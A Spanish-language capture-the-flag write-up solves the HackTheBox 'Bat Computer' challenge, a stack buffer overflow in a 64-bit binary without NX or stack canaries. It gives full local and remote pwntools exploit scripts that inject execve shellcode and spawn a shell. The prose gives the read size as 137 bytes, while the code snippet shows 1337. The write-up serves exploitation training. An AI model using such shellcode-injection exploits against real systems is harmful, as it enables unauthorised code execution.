---
title: Bat Computer - Pwn Challenge (HTB) ❤
author: sha-16
categories: [linux, binary exploitation, htb]
tags: [linux, pwn, htb, 64-bit] 
---

Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation. 

En esta ocasión, les traigo la resolución de un BoF en un binario de 64-bit. El desafío como tal, consiste en un programa que te da dos opciones a elegir:

1. **Track Joker:** Sólo imprime un texto con una dirección de memoria (`0x7fffffffe1a4`) que hasta ahora desconocemos.
2. **Chase Joker:** Esta opción le solicita una contraseña al usuario la cual le brinda supuesto acceso al “BatMobile”.

![Untitled](/assets/img/htb/pwn/BatComputer/Untitled.png)

Posterior a esto procedemos a reversear el código con Ghidra donde identificamos la contraseña que el programa nos solicita.

Es importante mencionar que el binario se encuentra *[stripped](https://en.wikipedia.org/wiki/Strip_(Unix))*, por lo cual, en primera instancia es algo difícil de identificar los nombres de las variables y funciones:

![Untitled](/assets/img/htb/pwn/BatComputer/Untitled%201.png)

Al momento de probar la contraseña, el programa la acepta y le solicita al usuario “comandos de navegación”, los cuales al ser ingresados no tienen mucha relevancia:

![Untitled](/assets/img/htb/pwn/BatComputer/Untitled%202.png)

Luego de aplicar reversing sobre el código, ahora se logra entender más la sintaxis y el flujo principal del programa:

![Untitled](/assets/img/htb/pwn/BatComputer/Untitled%203.png)

En este punto identificamos un *buffer overflow* en la variable `nav_command`, que corresponde a los “comandos de navegación”, debido a que esta tiene asignado `76 bytes` de memoria, sin embargo, al momento de leer el contenido de dicha variable con la función `read` esta acepta `137 bytes`. Por lo cual queda toda una región de memoria disponible para sobrescribir registros.

```c
int main(void) {
		...
		undefined nav_command [76]
		...
		read(0,nav_command,1337);
		...
}
```

Para validar esto, realizamos una prueba con la herramienta `gdb-gef`. 

1. Primeramente, creamos una cadena de `137 bytes`. 
2. Luego arrancamos el programa y seleccionamos la opción `2`, donde primero colocamos la contraseña del usuario. 
3. Posterior a esto, el programa solicita los “comandos de navegación” donde ingresamos la cadena de `137 bytes` con el objetivo de sobrescribir la memoria que tiene asignada la variable `nav_command`, lo cual corresponde a `76 bytes`.
4. Hecho esto, el programa vuelve a solicitarle una opción al usuario, lo cual sólo ocurre porque este se encuentra en un bucle infinito. Para forzar al programa a retornar debemos colocar un número que no corresponda a `1`, o `2`. De esta manera, como la dirección de retorno ha sido sobrescrita, el programa arrojará un error `Segmentation fault` y nos permitirá validar la existencia del BoF. 

![Untitled](/assets/img/htb/pwn/BatComputer/Untitled%204.png)

Al listar el offset, con la instrucción `pattern offset`, se identifica que se deben introducir `84 bytes` para sobrescribir la dirección de retorno:

![Untitled](/assets/img/htb/pwn/BatComputer/Untitled%205.png)

Antes de crear el exploit, es importante checar las protecciones que posee el binario. 

Como se muestra en imagen, el programa no cuenta con `NX (no-execute)`, ni `Stack Canaries`, lo cual significa que a la hora de explotar el *buffer overflow* podemos ejecutar código de manera arbitraria en la pila:  

![Untitled](/assets/img/htb/pwn/BatComputer/Untitled%206.png)

De esta forma, empezamos creando el exploit de la siguiente manera:

```python
#!/usr/bin/python3

from pwn import process, p64

if __name__ == '__main__':
    # Starting process
    elf = process('./batcomputer')

    # Extracting leaked memory address from "nav_command" variable
    elf.recvuntil(b'> ')
    elf.sendline(b'1')
    result_option1 = elf.recvline().decode()
    nav_command_addr = p64(int(result_option1.strip('It was very hard, but Alfred managed to locate him: '),16)) # Formating to x64

    # msfvenom -p linux/x64/exec -f python -v shellcode -> shellcode
    shellcode =  b""
    shellcode += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99"
    shellcode += b"\x50\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"

    offset = 84 # to overwrite return address
    padding = b"\x41" * (offset - len(shellcode))

    # Final payload    
    payload = shellcode + padding + nav_command_addr

    # Sending password to get the input to exploit
    elf.recvuntil(b'> ')
    elf.sendline(b'2')
    elf.recvuntil(b'password: ')
    elf.sendline(b'b4tp@$$w0rd!')

    # Sending payload to exploit the BoF
    elf.recvuntil(b'commands: ')
    elf.sendline(payload)

    # Generating call to the overwrited return address
    elf.recvuntil(b'> ')
    elf.sendline(b'3')

    # Getting an interactive shell
    elf.interactive()
```

Al ejecutar el exploit vemos que este nos ha entregado una shell completamente interactiva, lo cual significa que nuestro shellcode se ejecutó de manera exitosa al explotar el *buffer overflow*:

![Untitled](/assets/img/htb/pwn/BatComputer/Untitled%207.png)

Habiendo hecho esto, podemos adaptar el exploit para explotar el desafío de HackTheBox de manera remota:

```python
#!/usr/bin/python3

from argparse import ArgumentParser
from pwn import remote, p64

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('--host', type=str, required=True, help='Remote host (IP/Domain)')
    parser.add_argument('--port', type=int, required=True, help='Remote port')
    args = parser.parse_args()

    # Starting connection
    connection = remote(args.host, args.port)

    # Extracting leaked memory address from "nav_command" variable
    connection.recvuntil(b'> ')
    connection.sendline(b'1')
    result_option1 = connection.recvline().decode()
    nav_command_addr = p64(int(result_option1.strip('It was very hard, but Alfred managed to locate him: '),16)) # Formating to x64

    # msfvenom -p linux/x64/exec -f python -v shellcode
    shellcode =  b""
    shellcode += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99"
    shellcode += b"\x50\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"

    offset = 84 # to overwrite return address
    padding = b"\x41" * (offset - len(shellcode))

    # Final payload    
    payload = shellcode + padding + nav_command_addr

    # Sending password to get the input to exploit
    connection.recvuntil(b'> ')
    connection.sendline(b'2')
    connection.recvuntil(b'password: ')
    connection.sendline(b'b4tp@$$w0rd!')

    # Sending payload to exploit the BoF
    connection.recvuntil(b'commands: ')
    connection.sendline(payload)

    # Generating calling to the overwrited return address
    connection.recvuntil(b'> ')
    connection.sendline(b'3')

    # Getting an interactive shell
    connection.interactive()
```

Una vez ejecutado, logramos obtener una terminal interactiva en el servidor, donde podemos listar el contenido del archivo `flag.txt`:

![Untitled](/assets/img/htb/pwn/BatComputer/Untitled%208.png)